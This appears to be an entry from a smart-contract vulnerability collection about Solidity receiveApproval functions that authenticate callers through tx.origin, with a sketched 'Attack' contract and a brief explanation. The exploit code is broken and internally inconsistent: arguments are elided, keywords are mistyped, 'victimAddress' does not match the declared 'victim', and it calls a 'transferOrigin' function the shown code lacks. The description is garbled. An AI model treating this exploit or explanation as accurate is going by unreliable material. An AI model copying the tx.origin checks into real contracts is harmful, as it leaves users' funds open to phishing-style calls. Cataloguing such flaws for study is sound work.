## Vulnerable Code

```javascript
**Instance_1**
function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public {
       
        IERC20Token t = IERC20Token(_token);
        require(_token == address(token),"token is error" );
        require(_from == tx.origin,  "token from must equal tx.origin"); //Vulnerable position  
        require(isNotContract(_from),"token from  is not Contract");
        require(_value ==  mConfig.getPrice(),"value is error" );
        require(t.transferFrom(_from, this, _value),"transferFrom has error");

        bytes memory inviteBytes = slice(_extraData,0,_extraData.length-1);
        bytes memory numBytes = slice(_extraData,_extraData.length-1,1);
        uint8  num = uint8(bytesToUint(numBytes));
        bytes32 inviteName = stringToBytes32(inviteBytes);
        PK(_from,num,inviteName);
    }
    
    
**Instance_2**
    function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public {
       
        IERC20Token t = IERC20Token(_token);
        require(_token == address(token) );
        require(_from == tx.origin,  "token from must equal tx.origin");
        require(isNotContract(_from),"token from  is not Contract");
        require(_value == curConfig.singlePrice );
        require(t.transferFrom(_from, this, _value));
        addPlayer(_from);
        
        bytes32 inviteName = stringToBytes32(_extraData);
        inviteHandler(inviteName);
    }
```



## Exploit Code

```javascript
Contract Attack{
    address victim;
    function setVictimAddress(address _address){
        victim = _address;
    }
    function startAttack(){
        victimAddress.call(byte4(keccak256(“transferOrigin(address, uint256, address, bytes)”)), ..., ..., ..., ... );
        ...
    }
}
```



##  Sophisticated Vulnerability Description
Note the location of comment of vulnerability position.If an malicious contract such as "Attack" to call the Victim Contract function such as "transferOrigin", Due to the 'tx.origin' ,so "Attack" can bypass the body condition. ps:"...." represent an appropriate parameter
